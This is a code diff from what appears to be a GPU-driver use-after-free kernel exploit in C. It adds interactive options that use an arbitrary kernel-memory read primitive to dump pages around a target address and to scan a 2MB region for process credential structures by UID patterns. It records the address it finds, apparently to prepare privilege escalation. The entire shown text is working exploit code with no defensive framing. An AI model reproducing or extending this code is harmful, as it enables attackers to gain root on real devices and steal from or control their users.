@@ -1882,13 +1882,40 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                             hex_dump_internal("CRED", p, d, 128);
                         } else if (choice == '3') {
                             fprintf(stderr, "    Enter offset in hex (e.g. 6b8): ");
-                            char buf[16]; int len = read(0, buf, 15); buf[len] = 0;
+                            char buf[32]; int len = read(0, buf, 31); buf[len] = 0;
                             uint32_t custom_off = strtoul(buf, NULL, 16);
                             uint64_t custom_ptr = 0;
                             gpu_read_task_struct(fd, task_start_va + custom_off, (uint8_t *)&custom_ptr, 8);
                             fprintf(stderr, "    Offset 0x%x contains pointer: 0x%lx\n", custom_off, (unsigned long)custom_ptr);
-                            uint8_t d[64]; gpu_read_task_struct(fd, custom_ptr, d, 64);
-                            hex_dump_internal("Custom Pointer Target", custom_ptr, d, 64);
+                            uint8_t d[256]; gpu_read_task_struct(fd, custom_ptr, d, 256);
+                            hex_dump_internal("Custom Pointer Target", custom_ptr, d, 256);
+                        } else if (choice == '4') {
+                            fprintf(stderr, "    --- Dumping 5 Pages around 0x%lx ---\n", (unsigned long)current_va);
+                            for (int p = -2; p <= 2; p++) {
+                                uint64_t pva = current_va + p * PAGE_SIZE;
+                                uint8_t page_data[256];
+                                if (gpu_read_task_struct(fd, pva, page_data, 256) == 0) {
+                                    fprintf(stderr, "    [Page %+d at 0x%lx]\n", p, (unsigned long)pva);
+                                    hex_dump_internal("Neighbor Page", pva, page_data, 256);
+                                }
+                            }
+                        } else if (choice == '5') {
+                            fprintf(stderr, "    [*] Searching for CRED in GPU space around 0x%lx...\n", (unsigned long)current_va);
+                            int found = 0;
+                            for (int p = -256; p <= 256; p++) {
+                                uint64_t pva = current_va + p * PAGE_SIZE;
+                                uint32_t check[4];
+                                if (gpu_read_task_struct(fd, pva, (uint8_t *)check, 16) == 0) {
+                                    if (check[0] > 0 && check[0] < 50 && check[1] <= 20000 && check[1] == check[2]) {
+                                        fprintf(stderr, "    [+++] POTENTIAL CRED FOUND at GPU VA 0x%lx (UID %u, usage %u)\n", 
+                                                (unsigned long)pva, check[1], check[0]);
+                                        found_cred_ptr = pva;
+                                        found = 1;
+                                        break;
+                                    }
+                                }
+                            }
+                            if (!found) fprintf(stderr, "    [-] No CRED-like structures found in 2MB range.\n");
                         }
                     }
                 }
